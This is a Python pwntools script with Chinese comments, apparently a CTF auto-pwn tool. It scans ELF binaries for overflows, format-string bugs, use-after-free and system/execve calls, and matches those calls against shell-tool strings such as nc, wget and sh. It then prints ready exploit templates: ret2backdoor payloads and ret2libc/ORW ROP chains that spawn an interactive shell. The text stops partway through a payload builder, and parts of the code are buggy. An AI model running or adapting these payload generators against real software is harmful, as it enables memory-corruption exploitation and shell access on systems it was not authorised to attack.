#encoding=utf-8
from pwn import *
import numpy as np
import os
import sys
context.log_level='debug'
context.arch='amd64'

read_addr=0
gets_addr=0
puts_addr=0
printf_addr=0
strcpy_addr=0
scanf_addr=0
free_addr=0
malloc_addr=0
atoi_addr=0
strncpy_addr=0
system_addr=0
syscall_addr=0
execve_addr=0
write_addr=0
printogram_base=0
eh_frame_addr=0
start_offset=0
main_addr=0
mmap_addr=0
prctl_addr=0
stack_migration_addr=[]
stack_migration_size=[]
need_addr=[]
func_flag=[]

stackoverflow_addr=[]
stackoverflow_size=[]
stackoverflow_input_size=[]
backdoor_addr=[]
format_bug_addr=[]
def get_all(elf,file_os): #用pwntools搜素我们需要的库函数，如果是Ubuntu20需要进行-4定位到真正在汇编中的调用地址
	global printogram_base
	printogram_base = elf.address
	print('[+]printogram_base'+hex(printogram_base))
	global eh_frame_addr
	eh_frame_addr = elf.get_section_by_name('.eh_frame').header.sh_addr
	global start_offset
	start_offset = elf.header.e_entry
	offset = elf.read(start_offset, 0x40).find('\x48\xc7\xc7')  # mov rdi,?
	global main_addr
	main_addr = u32(elf.read(start_offset + offset + 3, 4))
	print('[+]eh_frame_addr:'+hex(eh_frame_addr))
	print('[+]start_offset:'+hex(start_offset))
	print('[+]main_addr:'+hex(main_addr))
	print("")
	#get_mmap
	try:
		global mmap_addr
		mmap_addr=elf.sym["mmap"]
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]mmap found addr :"+hex(mmap_addr))
			need_addr.append(hex(mmap_addr))
			func_flag.append("mmap")
		elif file_os ==20:
			print("[+]mmap found addr :"+hex(mmap_addr-4))
			need_addr.append(hex(mmap_addr-4))
			func_flag.append("mmap")
	finally:
		pass

	#get_prctl
	try:
		global prctl_addr
		prctl_addr=elf.sym["prctl"]
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]prctl found addr :"+hex(prctl_addr))
			need_addr.append(hex(prctl_addr))
			func_flag.append("prctl")
		elif file_os ==20:
			print("[+]prctl found addr :"+hex(prctl_addr-4))
			need_addr.append(hex(prctl_addr-4))
			func_flag.append("prctl")
	finally:
		pass

	#get_write
	try:
		global write_addr
		write_addr=elf.sym["write"]
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]write found addr :"+hex(write_addr))
			need_addr.append(hex(write_addr))
			func_flag.append("write")
		elif file_os ==20:
			print("[+]write found addr :"+hex(write_addr-4))
			need_addr.append(hex(write_addr-4))
			func_flag.append("write")
	finally:
		pass

	#get_execve
	try:
		global execve_addr
		execve_addr=elf.sym["execve"]
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]execve found addr :"+hex(execve_addr))
			need_addr.append(hex(execve_addr))
			func_flag.append("execve")
		elif file_os ==20:
			print("[+]execve found addr :"+hex(execve_addr-4))
			need_addr.append(hex(execve_addr-4))
			func_flag.append("execve")
	finally:
		pass

	#get_syscall
	try:
		global syscall_addr
		syscall_addr=elf.sym["syscall"]
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]syscall found addr :"+hex(syscall_addr))
			need_addr.append(hex(syscall_addr))
			func_flag.append("syscall")
		elif file_os ==20:
			print("[+]syscall found addr :"+hex(syscall_addr-4))
			need_addr.append(hex(syscall_addr-4))
			func_flag.append("syscall")
	finally:
		pass

	#get_system
	try:
		global syscall_addr
		system_addr=elf.sym["system"]
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]system found addr :"+hex(system_addr))
			need_addr.append(hex(system_addr))
			func_flag.append("system")
		elif file_os ==20:
			print("[+]system found addr :"+hex(system_addr-4))
			need_addr.append(hex(system_addr-4))
			func_flag.append("system")
	finally:
		pass

	#get_strncpy
	try:
		global strncpy_addr
		strncpy_addr=elf.sym["strncpy"]
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]strncpy found addr :"+hex(strncpy_addr))
			need_addr.append(hex(strncpy_addr))
			func_flag.append("strncpy")
		elif file_os ==20:
			print("[+]strncpy found addr :"+hex(strncpy_addr-4))
			need_addr.append(hex(strncpy_addr-4))
			func_flag.append("strncpy")
	finally:
		pass

	#get_scanf
	try:
		global scanf_addr
		scanf_addr=elf.sym["__isoc99_scanf"]
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]scanf found addr :"+hex(scanf_addr))
			need_addr.append(hex(scanf_addr))
			func_flag.append("scanf")
		elif file_os ==20:
			print("[+]scanf found addr :"+hex(scanf_addr-4))
			need_addr.append(hex(scanf_addr-4))
			func_flag.append("scanf")
	finally:
		pass

	#get_atoi
	try:
		global atoi_addr
		atoi_addr=elf.sym['atoi']
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]atoi found addr :"+hex(atoi_addr))
			need_addr.append(hex(atoi_addr))
			func_flag.append("atoi")
		elif file_os ==20:
			print("[+]atoi found addr :"+hex(atoi_addr-4))
			need_addr.append(hex(atoi_addr-4))
			func_flag.append("atoi")
	finally:
		pass

	#get_malloc
	try:
		global malloc_addr
		malloc_addr=elf.sym['malloc']
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]malloc found addr :"+hex(malloc_addr))
			need_addr.append(hex(malloc_addr))
			func_flag.append("malloc")
		elif file_os ==20:
			print("[+]malloc found addr :"+hex(malloc_addr-4))
			need_addr.append(hex(malloc_addr-4))
			func_flag.append("malloc")
	finally:
		pass

	#get_free
	try:
		global free_addr
		free_addr=elf.sym['free']
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]free found addr :"+hex(free_addr))
			need_addr.append(hex(free_addr))
			func_flag.append("free")
		elif file_os ==20:
			print("[+]free found addr :"+hex(free_addr-4))
			need_addr.append(hex(free_addr-4))
			func_flag.append("free")
	finally:
		pass

	#get_read
	try:
		global read_addr
		read_addr=elf.sym['read']
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]read found addr :"+hex(read_addr))
			need_addr.append(hex(read_addr))
			func_flag.append("read")
		elif file_os ==20:
			print("[+]read found addr :"+hex(read_addr-4))
			need_addr.append(hex(read_addr-4))
			func_flag.append("read")
	finally:
		pass

	#get_gets
	try:
		global gets_addr
		gets_addr=elf.sym['gets']
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]gets found addr :"+hex(gets_addr))
			need_addr.append(hex(gets_addr))
			func_flag.append("gets")
		elif file_os ==20:
			print("[+]gets found addr :"+hex(gets_addr-4))
			need_addr.append(hex(gets_addr-4))
			func_flag.append("gets")
	finally:
		pass

	#get_puts
	try:
		global puts_addr
		puts_addr=elf.sym['puts']
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]puts found addr :"+hex(puts_addr))
			need_addr.append(hex(puts_addr))
			func_flag.append("puts")
		elif file_os ==20:
			print("[+]puts found addr :"+hex(puts_addr-4))
			need_addr.append(hex(puts_addr-4))
			func_flag.append("puts")
	finally:
		pass

	#get_printf
	try:
		global printf_addr
		printf_addr=elf.sym['printf']
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]printf found addr :"+hex(printf_addr))
			need_addr.append(hex(printf_addr))
			func_flag.append("printf")
		elif file_os ==20:
			print("[+]printf found addr :"+hex(printf_addr-4))
			need_addr.append(hex(printf_addr-4))
			func_flag.append("printf")
	finally:
		pass

	#get_strcpy
	try:
		global strncpy_addr
		strcpy_addr=elf.sym['strcpy']
	except Exception as e:
		pass
	else:
		if file_os == 18:
			print("[+]strcpy found addr :"+hex(strcpy_addr))
			need_addr.append(hex(strcpy_addr))
			func_flag.append("strcpy")
		elif file_os ==20:
			print("[+]strcpy found addr :"+hex(strcpy_addr-4))
			need_addr.append(hex(strcpy_addr-4))
			func_flag.append("strcpy")
	finally:
		pass
file_os=0 #系统变量
os_16_flag=0 #额外定义Ubuntu16
def search_call_what(elf,file_name): #库函数调用地址寻找，危险函数检测
	cmd = os.popen("strings ./"+file_name+" | grep GCC")
	found_file_os=cmd.read() #利用管道获取GCC查询结果获取系统版本
	print("[+]Found file_os ing..."+found_file_os)
	if "18.04" in found_file_os :
		file_os=18
		os_16_flag=0
	elif "16.04" in found_file_os:
		file_os=18
		os_16_flag=1
	elif "20.04" in found_file_os:
		file_os=20
		os_16_flag=0
	else:
		print("[+]MAYBE YOU BUILD YOUR BINARY IN OTHER OS,BUT WE DO NOT SUPPORT TO CHECK IT ,SORRY!")
		exit(0)
	get_all(elf,file_os)#开始查询库函数是否存在，进行初始化
	print("")
	call=((elf.search(b'\xE8')))#全局搜索call指令特征，有误报可能性但是无所谓，下面有公式校验
	all_addr=np.array(list(call))#list化为array
	all_len=len(all_addr)#计算长度
	for i in range(all_len):#循环查询call 调用以及危险函数检测
		rip=u64(elf.read(int(all_addr[i]),5)[1:].ljust(8,'\x00'))
		real_all=0xffffffff00000005+rip
		'''
		原理很简单 ，先用汇编找到现在的相对地址，然后代入函数到这时候的call 求一个相对地址 这两个地址比对

  		这里细说下计算公式
		例子： call 0x5B0 的汇编码是E8 58 FE FF FF，E8是call指令，后面的就是相对地址0xFFFFFE58 是一个负数，证明调用函数在该call地址的上方
		 这个reald_all本身的计算方法是如下
		此处举例strcpy=0x5B0 call 0x5B0的地址是0x753 我们利用0x5B0-0x753得到的地址是0xFFFF FFFF FFFF FE5D 可以看见汇编低三位是0xE58
		这个和我们的reald_all相差0x5 这个0x5就是指令本身的长度(call 0x5B0)这个长度是需要加入到地址里面的所以才有了公式里面的0xffffffff00000005末尾是5
    	'''
		for j in range(len(need_addr)):
			fuzz_addr_tmp=0-(int(need_addr[j],16)-int(all_addr[i]))#need_addr里面存放库函数地址 all_addr存放所有的call调用 ，作差得到相对地址
			fuzz_addr=0x1000-fuzz_addr_tmp+0xfffffffffffff000
			#由于python十六进制不会变成大数，为了后续操作我们要主动转化，利用低3位不变特性用0x1000减去上面的相对地址，然后加上基地址0xfffffffffffff000 就可以得到每一个库函数在call xxx的时候的相对地址了
			#有了这个相对地址，我们就可以和前面的real_all去对比，对比上了谁就是call 谁了
			#比如 call read  但是函数列表里面有 read puts scanf 等等 我们只需要把函数列表的函数地址代入这个call点位计算相对地址再去和他此时真正的相对地址对比就可以获取到call 谁了

			#static编译 read这些函数在下面的 这样得到的fuzz_addr_tmp应该是正数，但是因为上面公式问题导致是负数，所以下面要进行翻转
			if fuzz_addr_tmp<0:
				real_all=rip+5#指令长度加上目标函数地址等于真实相对地址
				fuzz_addr=0-fuzz_addr_tmp#fuzz出来的相对地址 
   			
			if fuzz_addr==real_all: #如果比对成功就进行漏洞检测
				print(hex(all_addr[i])+" call "+(need_addr[j])+" ["+func_flag[j]+"]")
				if func_flag[j]=="read":
					check_flag=u64(elf.read(int(all_addr[i]-0x19),7)[6:7].ljust(8,'\x00'))
					off_by_null=(elf.read(int(all_addr[i]),0x80).find('\xc6\x00\x00'))
					print("[+]check_flag :"+hex(check_flag))
					if check_flag == 0xFF: 
						'''
      		read检测有很多很多种，后续会增加特征，这里直接用常见的特征lea xx 类型 这种又分为大小数组2种，小数组极限是0x80，lea  rax, [rbp+buf]	指令此时长度就是4
			大于这个长度的数组长度就是7了结尾汇编必然是0xFF，由此可以判断大小字符数组进行read溢出，判断
           '''
						check_read_overflow_big(elf,all_addr[i])
					else:
						check_read_overflow_small(elf,all_addr[i])

					print("")
					if off_by_null !=-1:
						print("[+]MAYBE HAV THE OFF BY NULL BUG!")
				if func_flag[j]=="gets":#gets检测到直接算溢出
					print("[+]use gets have stackoverflow!")
				elif func_flag[j]=="scanf":
					'''
				scanf检测也有N多特征，都怪GCC的“优化”操作
				这里分为16和16以上的版本 mov     edi, offset aS 这个是Ubuntu16的%s mov操作
				从call scanf 到他的距离是5，去掉开头一字节的汇编mov edi指令，后4位就是他的%s字符串的地址Ubuntu16的mov edi采用的是绝对地址
				这样免去了我们过多的计算挺好的，然后用pwntools的read模块读取该地址的字符串和他的十六进制对比如果是%s就定义为溢出
    
				Ubuntu18 20的同理，只是他的地址不是绝对地址要进行计算得到绝对地址 lea     rdi, aS长度为7
				call scanf到这长度为0xc 前3字节为 lea rdi汇编码阉割去除，保留剩下4个相对地址 再去加上此时lea     rdi, aS指令的地址就可以获取到 %s的地址
				后面同样read处理比对
     		'''
					if os_16_flag==1:
						the_s=u64(elf.read(int(all_addr[i]-0xa),5)[1:].ljust(8,'\x00'))
						the_s_addr=the_s
						code_s=u64(elf.read(int(the_s_addr),3).ljust(8,'\x00'))
						if code_s==0x7325:
							print("[+]use scanf('%s') have stackoverflow!")
							print("")
						else:
							print("")
					else:
						the_s=u64(elf.read(int(all_addr[i]-0xc),7)[3:].ljust(8,'\x00'))+7
						the_s_addr=the_s+all_addr[i]-0xc
						code_s=u64(elf.read(int(the_s_addr),3).ljust(8,'\x00'))
						if code_s==0x7325:
							print("[+]use scanf('%s') have stackoverflow!")
							print("")
						else:
							print("")
				elif func_flag[j]=="printf":
					'''
					printf直接检测mov     rdi, rax这句汇编就可以定义成格式化了,还有检测bss段数据
     				'''
					the_buf=u64(elf.read(int(all_addr[i]-0x8),3).ljust(8,'\x00'))
					bss_buf=u64(elf.read(int(all_addr[i]-0xc),7)[3:].ljust(8,'\x00'))
					if the_buf ==0xc78948:
						print("[+]use pritnf(buf) have format bug!")
						format_bug_addr.append(int(all_addr[i]))
						print("")
					elif bss_buf>0x10000:
						print("[+]use pritnf(buf) have format bug!")
						format_bug_addr.append(int(all_addr[i]))
						print("")
					else:
						print("")
				elif func_flag[j]=="strcpy":
					'''
     				这个strcpy就比较难受了，这里暂时只收集了2种特征，一种是数组复制到数组，另外一种是指针复制到数组
					数组到数组这个也分2种，大数组和小数组，原理和read差不多都是看尾部汇编
					指针到数组结尾必定是0x8 因为char指针长度就是0x8大小的
         			'''
					check_flag=u64(elf.read(int(all_addr[i]-0x14),7)[6:7].ljust(8,'\x00'))
					check_flag_2=u64(elf.read(int(all_addr[i]-0x11),4)[3:4].ljust(8,'\x00'))
					if check_flag == 0xFF:
						check_big_strcpy_overflow(elf,all_addr[i])
					elif check_flag_2==0xF8:
						print("[+]maybe have strcpy not limit length pointer copy overflow!")
						print("")
					else:
						check_small_strcpy_overflow(elf,all_addr[i])
				elif func_flag[j]=="strncpy":
					check_flag=u64(elf.read(int(all_addr[i]-0xB),1).ljust(8,'\x00'))
					if check_flag==0xBA:
						check_fixed_strncpy(elf,all_addr[i])
					else:
						print("[+]this strncpy rdx can be controlled,please be cared!")
						print("")
				elif func_flag[j]=="free":
					try:
						free_flag=(elf.read(int(all_addr[i]),0x28).find("\x48\xC7"))
						if free_flag == -1:
							print("[+]maybe have UAF!")
							print("")
					except Exception as e:
						
						print("")
					else:
						print("")
					finally:
						pass
				elif func_flag[j]=="system":
					#检测system调用，rdi参数是否可控，是否存危险参数
					#并且分为开了pie和没开pie2种判断
					the_s=u64(elf.read(int(all_addr[i]-0xc),7)[3:].ljust(8,'\x00'))+7
					the_s_addr=the_s+all_addr[i]-0xc
					if elf.pie:
						if the_s_addr>0x1000:
							print("[+]the command value can be modify!")
							print("")
							continue
					else:
						if the_s_addr>0x500000:
							print("[+]the command value can be modify!")
							print("")
							continue
					try:
						code_s=(elf.read(int(the_s_addr),0x10).find("\x2F\x62\x69\x6E\x2F"))
						if code_s==-1:
							pass
						else:
							print("[+]Found /bin/xxx be used by system")
							push_rbp=u64(elf.read(int(all_addr[i]-0x10),1).ljust(8,'\x00'))
							print(hex(push_rbp))
							if push_rbp == 0x55:#判断system是否存在单个函数的调用情况，常用于ctf
								print("[+]Found backdoor")
								backdoor_addr.append(int(all_addr[i]-0x10))
								
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x65\x78\x65\x63\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found exec be used by system")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x6E\x63\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found nc be used by system")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x70\x69\x6E\x67\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found ping be used by system")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x67\x63\x63\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found gcc be used by system")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x2D\x69\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found -i be used by system")
							print("")


						code_s=(elf.read(int(the_s_addr),0x10).find("\x72\x6D\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found rm be used by system")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x66\x69\x6E\x64\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found find be used by system")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x65\x78\x65\x6F\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found exeo be used by system")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x65\x63\x68\x6F\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found echo be used by system")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x77\x67\x65\x74\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found wget be used by system")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x6C\x73"))
						if code_s==-1:
							pass
						else:
							print("[+]Found ls be used by system")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x73\x68"))
						if code_s==-1:
							pass
						else:
							print("[+]Found sh or bash be used by system")
							print("")
					except Exception as e:
						print("")
						pass
					else:
						print("")
					finally:
						pass
				elif func_flag[j]=="syscall":
					#检测系统调用号，判断调用了什么函数
					syscall_number=u64(elf.read(int(all_addr[i]-0xA),5)[1:].ljust(8,'\x00'))
					try:
						print("[+]syscall is :"+syscall_table[syscall_number])
						print("")
					except Exception as e:
						raise
						print("[+]syscall is type is not found")
						print("")
					else:
						pass
					finally:
						pass
				elif func_flag[j]=="execve":
					#检测execve调用，rdi参数是否可控，是否存危险参数
					#并且分为开了pie和没开pie2种判断
					the_s=u64(elf.read(int(all_addr[i]-7),7)[3:].ljust(8,'\x00'))+7
					the_s_addr=the_s+all_addr[i]-0xc
					if elf.pie:
						if the_s_addr>0x1000:
							print("[+]the command value can be modify!")
							print("")
							continue
					else:
						if the_s_addr>0x500000:
							print("[+]the command value can be modify!")
							print("")
							continue
					try:
						code_s=(elf.read(int(the_s_addr),0x10).find("\x2F\x62\x69\x6E\x2F"))
						if code_s==-1:
							pass
						else:
							print("[+]Found /bin/xxx be used by execve")
							push_rbp=u64(elf.read(int(all_addr[i]-0x10),1).ljust(8,'\x00'))
							if push_rbp == 0x55:#判断system是否存在单个函数的调用情况，常用于ctf
								print("[+]Found backdoor")
								backdoor_addr.append(int(all_addr[i]-0x10))
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x65\x78\x65\x63\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found exec be used by execve")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x6E\x63\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found nc be used by execve")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x70\x69\x6E\x67\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found ping be used by execve")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x67\x63\x63\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found gcc be used by execve")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x2D\x69\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found -i be used by execve")
							print("")


						code_s=(elf.read(int(the_s_addr),0x10).find("\x72\x6D\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found rm be used by execve")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x66\x69\x6E\x64\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found find be used by execve")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x65\x78\x65\x6F\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found exeo be used by execve")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x65\x63\x68\x6F\x00"))
						if code_s==-1:
							print("")
						else:
							print("[+]Found echo be used by execve")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x77\x67\x65\x74\x00"))
						if code_s==-1:
							pass
						else:
							print("[+]Found wget be used by execve")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x6C\x73"))
						if code_s==-1:
							pass
						else:
							print("[+]Found ls be used by execve")
							print("")

						code_s=(elf.read(int(the_s_addr),0x10).find("\x73\x68"))
						if code_s==-1:
							pass
						else:
							print("[+]Found sh or bash be used by execve")
							print("")
					except Exception as e:
						print("")
						pass
					else:
						print("")
					finally:
						pass
				elif func_flag[j]=="mmap":
					#mmap检测大小区块，权限
					mmap_where=u64(elf.read(int(all_addr[i]-0xA),5)[1:].ljust(8,'\x00'))
					mmap_size=u64(elf.read(int(all_addr[i]-0xF),5)[1:].ljust(8,'\x00'))
					mmap_flags=u64(elf.read(int(all_addr[i]-0x14),5)[1:].ljust(8,'\x00'))
					print("[+]mmap a "+hex(mmap_size)+" in "+hex(mmap_where)+" it's jurisdiction is "+hex(mmap_flags))
					print("")
				else:
					print("")
	if len(backdoor_addr):#存在后门开启后门rop构造
		ret2backdoor(file_name,file_os)
	if len(stackoverflow_addr) and len(backdoor_addr)==0 and (prctl_addr)!=0:#存在溢出但是不存在后门，开启ret2libc rop构造
		ret2libc(file_name,file_os)
	if len(stackoverflow_addr) and len(backdoor_addr)==0 and (prctl_addr):
		ret2libc_orw(file_name,file_os)
	if len(stack_migration_addr):#栈迁移构造，暂时只做了getshell的模板，后续开启ORW操作模板自动化生成
		stack_migration(file_name,file_os)
def check_read_overflow_small(elf,call_addr):
    #小数组栈溢出检测长度小于0x80而且是与0x100作差形成一个相对值赋予的，利用公式简单计算就可以得到rsi大小，rdx大小直接获取，没有进行作差计算
	rsi=u64(elf.read(int(call_addr-0x16),4)[3:].ljust(8,'\x00'))
	rsi_size=0x100-rsi
	

	rdx=u64(elf.read(int(call_addr-0x12),5)[1:].ljust(8,'\x00'))
	rdx_size=rdx
	

	if rdx_size>rsi_size:#判断rdx是否比数组大
		print("[+]"+hex(call_addr)+" able_input_size : "+hex(rdx_size))
		print("[+]"+hex(call_addr)+" buf_size : "+hex(rsi_size))
		print("[+]have stackoverflow!")
		stackoverflow_addr.append(call_addr)
		stackoverflow_size.append(rsi_size+8)
		stackoverflow_input_size.append(rdx_size)
		if 0x10<=rdx_size-rsi_size<=0x20:#判断溢出空间是否为栈迁移类型
			stack_migration_addr.append(call_addr-0x16)
			stack_migration_size.append(rsi_size)
		if rdx_size>0x10000:#超大类溢出，基本上是误判，往BSS区段读写数据了，这个不好判断，以后有空了做二次判断
			stackoverflow_addr.pop()
			stackoverflow_size.pop()
			stackoverflow_input_size.pop()
			if len(stack_migration_addr):
				stack_migration_addr.pop()
				stack_migration_size.pop()
			print("[+]waring: this is maybe an error check,just like get value from bss.")
		else:
			print("")

	else:
		print("")

def check_read_overflow_big_2(elf,call_addr): #和上面的小数组判断基本上同理
    #大数组与0x100000000作差
	rsi=u64(elf.read(int(call_addr-0x11),4)[3:].ljust(8,'\x00'))
	rsi_size=0x100-rsi

	rdx=u64(elf.read(int(call_addr-0xD),5)[1:].ljust(8,'\x00'))
	rdx_size=rdx
	
	print(hex(rdx_size))
	print(hex(rsi_size))

	if rdx_size>rsi_size:
		print("[+]"+hex(call_addr)+" buf_size : "+hex(rsi_size))
		print("[+]"+hex(call_addr)+" able_input_size : "+hex(rdx_size))
		print("[+]have stackoverflow!")
		stackoverflow_addr.append(call_addr)
		stackoverflow_size.append(rsi_size+8)
		stackoverflow_input_size.append(rdx_size)
		if 0x10<=rdx_size-rsi_size<=0x20:
			stack_migration_addr.append(call_addr-0x19)
			stack_migration_size.append(rsi_size)
		if rdx_size>0x10000:
			stackoverflow_addr.pop()
			stackoverflow_size.pop()
			stackoverflow_input_size.pop()
			if len(stack_migration_addr):
				stack_migration_addr.pop()
				stack_migration_size.pop()
			print("[+]waring: this is maybe an error check,we can not solve it!")

		else:
			print("")

	else:
		print("")

def check_read_overflow_big(elf,call_addr): #和上面的小数组判断基本上同理
    #大数组与0x100000000作差
	rsi=u64(elf.read(int(call_addr-0x19),7)[3:].ljust(8,'\x00'))
	rsi_size=0x100000000-rsi
	

	rdx=u64(elf.read(int(call_addr-0x12),5)[1:].ljust(8,'\x00'))
	rdx_size=rdx
	

	if rdx_size>rsi_size:
		print("[+]"+hex(call_addr)+" buf_size : "+hex(rsi_size))
		print("[+]"+hex(call_addr)+" able_input_size : "+hex(rdx_size))
		print("[+]have stackoverflow!")
		stackoverflow_addr.append(call_addr)
		stackoverflow_size.append(rsi_size+8)
		stackoverflow_input_size.append(rdx_size)
		if 0x10<=rdx_size-rsi_size<=0x20:
			stack_migration_addr.append(call_addr-0x19)
			stack_migration_size.append(rsi_size)
		if rdx_size>0x10000:
			stackoverflow_addr.pop()
			stackoverflow_size.pop()
			stackoverflow_input_size.pop()
			if len(stack_migration_addr):
				stack_migration_addr.pop()
				stack_migration_size.pop()
			print("[+]waring: this is maybe an error check,now use other check!")
			check_read_overflow_big_2(elf,call_addr)

		else:
			print("")

	else:
		print("")

def check_small_strcpy_overflow(elf,call_addr):
    #小数组strcpy复制，原理同read
	rdi=u64(elf.read(int(call_addr-10),4)[3:].ljust(8,'\x00'))
	rdi_size=0x100-rdi
	

	rsi=u64(elf.read(int(call_addr-14),4)[3:].ljust(8,'\x00'))
	rsi_size=0x100-rsi
	

	if rsi_size>rdi_size:
		print("[+]"+hex(call_addr)+" rdi_size : "+hex(rdi_size))
		print("[+]"+hex(call_addr)+" rsi_size : "+hex(rsi_size))
		print("[+]have strcpy overflow!")
		print("")
	else:
		print("")

def check_big_strcpy_overflow(elf,call_addr):
    #大数组strcpy复制，原理同read
	rdi=u64(elf.read(int(call_addr-0xd),7)[3:].ljust(8,'\x00'))
	rdi_size=0x100000000-rdi
	

	rsi=u64(elf.read(int(call_addr-0x14),7)[3:].ljust(8,'\x00'))
	rsi_size=0x100000000-rsi
	

	if rsi_size>rdi_size:
		print("[+]"+hex(call_addr)+" rsi_size : "+hex(rsi_size))
		print("[+]"+hex(call_addr)+" rdi_size : "+hex(rdi_size))
		print("[+]have strcpy overflow!")
		print("")
	else:
		print("")

def check_fixed_strncpy(elf,call_addr):#寻找rdx参数和rdi数组大小
	fixed_size=u64(elf.read(int(call_addr-0xB),5)[1:].ljust(8,'\x00'))
	buf=u64(elf.read(int(call_addr-0x12),7)[3:].ljust(8,'\x00'))
	
	buf_size=0x100000000-buf
	
	if fixed_size>buf_size:#rdx大于数组则为溢出，后续加入误报检测处理
		print("[+]"+hex(call_addr)+" fixed_size : "+hex(fixed_size))
		print("[+]"+hex(call_addr)+" buf_size : "+hex(buf_size))
		print("[+]have strncpy overflow!")
		print("")
	else:
		print("")
def ret2backdoor(file_name,file_os):#分为Ubuntu18和别的Ubuntu，Ubuntu18加上ret平衡栈，当然有时候不用平衡，还有各种程交互序逻辑都由用户自己判断，本处只给出建议EXP
	elf=ELF(file_name)
	ret=next(elf.search(asm("ret")))
	if elf.canary or elf.pie:
		pass
	else:
		for i in range(len(stackoverflow_size)):
			for j in range(len(backdoor_addr)):
				if file_os==18:
					payload="payload="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])+"+p64("+hex(ret)+")"+"+p64("+hex(backdoor_addr[j])+")"
					print("[+]the ubuntu18 advice ret2backdoor payload is :"+payload)
					print("[+]the utilization point exp is:")
					print("from pwn import *")
					print("r=process("+"'"+file_name+"'"+")")
					print(payload)
					print("r.send(payload)")
					print("r.interactive()")
					print("")
				else:
					payload="payload="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])+"+p64("+hex(backdoor_addr[j])+")"
					print("[+]the ubuntu16,20 advice ret2backdoor payload is :"+payload)
					print("[+][+]the utilization point exp is:")
					print("from pwn import *")
					print("r=process("+"'"+file_name+"'"+")")
					print("payload="+payload)
					print("r.send(payload)")
					print("r.interactive()")
					print("")

def ret2libc_orw(file_name,file_os):
	elf=ELF(file_name)
	ret=next(elf.search(asm("ret")))
	rdi=next(elf.search(asm("pop rdi;ret")))
	pop_rsi_r15_ret=next(elf.search(asm("pop rsi;pop r15;ret")))
	bss_addr=elf.get_section_by_name('.bss').header.sh_addr
	print('.bss===>' + str(hex(bss_addr)))
	libc_addr="/lib/x86_64-linux-gnu/libc.so.6"
	if elf.canary or elf.pie:
		pass
	else:
		for i in range(len(stackoverflow_size)):
			if (puts_addr>0):
				if(stackoverflow_input_size[i]-stackoverflow_size[i]>0x80):

					payload3="payload3="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])+"+p64("+hex(rdi)+")"+"+p64("+hex(0)+")"+"+p64("+hex(pop_rsi_r15_ret)+")"+"+p64("+hex(bss_addr+0x200)+")"+"+p64("+hex(0)+")"+"+p64(reads)"+"+p64("+hex(main_addr)+")"

					payload1="payload1="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])+"+p64("+hex(rdi)+")"+"+p64("
					payload1+=hex(elf.got['puts'])+")"+"+p64("+hex(elf.plt['puts'])+")"+"+p64("+hex(main_addr)+")"

					payload2="payload2="+"'"+'a'+"'"+"*"+hex(stackoverflow_size[i])+"+p64("+hex(rdi)+")"+"+p64("+hex(bss_addr+0x200)+")"+"+p64("+hex(pop_rsi_r15_ret)+")"+"+p64("+hex(0664)+")"+"+p64("+hex(0)+")"+"+p64(opens)"
